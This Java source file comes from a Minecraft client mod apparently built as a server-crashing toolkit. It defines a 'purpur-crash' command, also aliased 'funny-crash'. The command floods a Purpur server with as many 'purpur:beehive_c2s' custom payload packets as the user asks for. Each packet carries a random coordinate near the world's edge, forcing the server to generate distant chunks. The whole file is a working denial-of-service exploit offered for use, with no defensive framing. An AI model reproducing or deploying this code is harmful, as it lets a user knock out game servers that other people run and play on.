package antip2w.tools.command;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.random.Random;

import static com.mojang.brigadier.arguments.IntegerArgumentType.integer;

public class PurpurCrash extends BetterCommand {

    public PurpurCrash() {
        super("purpur-crash", "Sends custom payload packets that causes the server to generate chunks at random locations.", "funny-crash");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("packets", integer(1), this::execute));
    }

    private void execute(int packets) {
        info("Sending %d packet(s)".formatted(packets));

        Random random = Random.create();

        for (int i = 0; i < packets; i++) {
            sendCustomPayload(Identifier.of("purpur", "beehive_c2s"), data -> data.writeLong(new BlockPos(
                random.nextBetween(-30_000_000, 30_000_000),
                random.nextBetween(250, 254),
                random.nextBetween(-30_000_000, 30_000_000)).asLong()
            ));
        }
    }

}
